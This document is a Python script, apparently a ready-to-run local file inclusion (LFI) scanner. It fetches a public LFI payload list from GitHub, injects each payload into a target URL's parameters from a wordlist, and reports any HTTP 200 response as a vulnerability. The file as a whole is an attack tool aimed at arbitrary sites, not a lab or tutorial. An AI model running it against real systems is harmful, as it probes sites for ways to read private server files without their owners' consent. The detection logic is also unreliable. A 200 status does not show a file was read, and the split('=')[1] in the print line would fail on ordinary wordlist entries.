import requests
import argparse

def test_vulnerability(url):
    response = requests.get(url, allow_redirects=False)
    status_code = response.status_code
    return status_code == 200

def download_payloads(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text.split("\n")
    except requests.exceptions.RequestException as e:
        print(f"Error downloading payloads: {e}")
        return []

def main():
    parser = argparse.ArgumentParser(description="LFI Vulnerability Scanner")
    parser.add_argument("-w", "--wordlist", required=True, help="Wordlist for fuzzing position")
    parser.add_argument("-u", "--url", required=True, help="Base URL of the vulnerable application")
    args = parser.parse_args()

    payloads_url = "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
    payloads = download_payloads(payloads_url)

    if not payloads:
        print("No payloads downloaded. Exiting.")
        return

    with open(args.wordlist, "r") as wordlist_file:
        custom_dictionary = [line.strip() for line in wordlist_file]

    for word in custom_dictionary:
        for payload in payloads:
            fuzzed_url = args.url.replace("FUZZ", f"{word}={payload}")
            if test_vulnerability(fuzzed_url):
                print(f"Vulnerable to LFI: Word: {word.split('=')[1]}, Payload: {payload}, Fuzzed URL: {fuzzed_url}")

if __name__ == "__main__":
    main()
